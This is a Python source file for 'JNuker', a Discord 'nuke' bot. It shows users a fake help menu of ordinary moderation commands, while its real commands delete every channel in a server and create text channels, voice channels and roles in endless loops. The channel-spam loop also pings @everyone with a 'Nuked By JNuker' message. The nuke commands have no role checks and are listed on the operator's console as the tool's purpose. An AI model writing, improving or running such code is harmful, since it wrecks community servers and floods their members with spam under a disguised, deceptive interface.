import discord 
import colorama
import os
from discord.ext import commands
from discord.utils import get
from colorama import Fore
import token
import random
os.system(f'cls & mode 100,18 & title JNuker!')

print(Fore.RED +  """
  ▄▄▄▄▄  ▄     ▄   █  █▀ ▄███▄   █▄▄▄▄ 
▄▀  █     █     █  █▄█   █▀   ▀  █  ▄▀ 
    █ ██   █ █   █ █▀▄   ██▄▄    █▀▀▌  
 ▄ █  █ █  █ █   █ █  █  █▄   ▄▀ █  █  
  ▀   █  █ █ █▄ ▄█   █   ▀███▀     █   
      █   ██  ▀▀▀   ▀             ▀    
            Made By Jose#0001""")
token = input(Fore.LIGHTCYAN_EX + 'Enter Discord Bot Token:')
TOKEN = token
os.system('cls')


bot = commands.Bot(command_prefix=";" ,help_command=None)
bot.remove_command('help')


@bot.event
async def on_ready():
    print(Fore.RED +  """
  ▄▄▄▄▄  ▄     ▄   █  █▀ ▄███▄   █▄▄▄▄ 
▄▀  █     █     █  █▄█   █▀   ▀  █  ▄▀ 
    █ ██   █ █   █ █▀▄   ██▄▄    █▀▀▌  
 ▄ █  █ █  █ █   █ █  █  █▄   ▄▀ █  █  
  ▀   █  █ █ █▄ ▄█   █   ▀███▀     █   
      █   ██  ▀▀▀   ▀             ▀    
         Made By Jose#0001""")
    print(Fore.YELLOW + 'We Have Awaked {0.user}'.format(bot))
    print(Fore.CYAN + "Fake Command: The Prefix Is ;Help For The Fake Menu")
    print(Fore.LIGHTBLUE_EX + 'Discord Nuke Commands Below')
    print(Fore.MAGENTA + """
1. ;Delete
2. ;Spam name
3. ;VC name
4. ;Role name
Note: Make Sure To Type This In A  Text Channel In The Discord Server Your Trying To Nuke
    """)



@bot.command(name="Ping")
async def Ping(ctx: commands.Context):
    await ctx.send(f"The Bots Ping: {round(bot.latency * 1000)}ms")




@bot.command(name='Help')
async def Help(ctx):
  embed = discord.Embed(
    title = 'Help Commands:',
    description = 'This Will Tell You All The Features The Bot Has And How To Use The Bot Features',
    color = discord.Color.blue()
  )
  embed.set_footer(text=f'Requested By - {ctx.author}',icon_url=ctx.author.avatar_url)
  embed.add_field(name='Credits',value='Made By Enter Your Name Here')
  embed.add_field(name='Moderation',value='Ban,Kick,UnBan',inline=False)
  embed.add_field(name='How To Use Moderation Commands',value=';Ban [Username] ;Kick [Username] ;Unban [User]',inline=False)
  embed.add_field(name='Utilities',value='Purge Chat, Ping',inline=False)
  embed.add_field(name='How To Use Utilities Commands',value=';Purge [Amount Of Messages], ;Ping',inline=False)
  await ctx.send(embed=embed)




@bot.command()
@commands.has_any_role('Mod', 'Founder', 'Support', 'Helper', 'Owner','Staff','Admin', 'Moderator', 'MOD', 'FOUNDER', 'SUPPORT', 'HELPER', 'OWNER','STAFF','ADMIN', 'MODERATOR')
async def Purge(ctx, amount=300):
    await ctx.channel.purge(limit=amount+1)
    await ctx.send(f"All Messages SucessFully Deleted")




@bot.command()
async def Spam(ctx, arg: str):
    allowed_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild
    while True:
        channel = await guild.create_text_channel(arg)
        await channel.send(content = "@everyone Nuked By JNuker https://github.com/Joseloll/JNuker", allowed_mentions = allowed_mentions)



@bot.command()
async def Delete(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
     await channel.delete()    




@bot.command()
@commands.has_any_role('Mod', 'Founder', 'Support', 'Helper', 'Owner','Staff','Admin', 'Moderator', 'MOD', 'FOUNDER', 'SUPPORT', 'HELPER', 'OWNER','STAFF','ADMIN', 'MODERATOR')
async def Kick(ctx, user: discord.Member, *, reason=None):
    await user.kick(reason=reason)
    await ctx.send(f'{user} Has Been Kicked From The Server!')




@bot.command()
@commands.has_any_role('Mod', 'Founder', 'Support', 'Helper', 'Owner','Staff','Admin', 'Moderator', 'MOD', 'FOUNDER', 'SUPPORT', 'HELPER', 'OWNER','STAFF','ADMIN', 'MODERATOR')
async def Ban(ctx, user: discord.Member, *, reason=None):
    await user.ban(reason=reason)
    await ctx.send(f'{user} Has Been Banned From The Server!')




@bot.command()
@commands.has_any_role('Mod', 'Founder', 'Support', 'Helper', 'Owner','Staff','Admin', 'Moderator', 'MOD', 'FOUNDER', 'SUPPORT', 'HELPER', 'OWNER','STAFF','ADMIN', 'MODERATOR')
async def Unban(ctx, *, member):
    bannedUsers = await ctx.guild.bans()
    name, discriminator = member.split("#")

    for ban in bannedUsers:
        user = ban.user

        if(user.name, user.discriminator) == (name, discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"{user.mention} was unbanned.")
            return



 
@bot.command()
async def VC(ctx, arg : str):
    while True:
        guild = ctx.message.guild
        channels = await guild.create_voice_channel(arg)




@bot.command()
async def Role(ctx, *, name):
    while True:
        guild = ctx.guild
        await guild.create_role(name=name)




bot.run(token) 
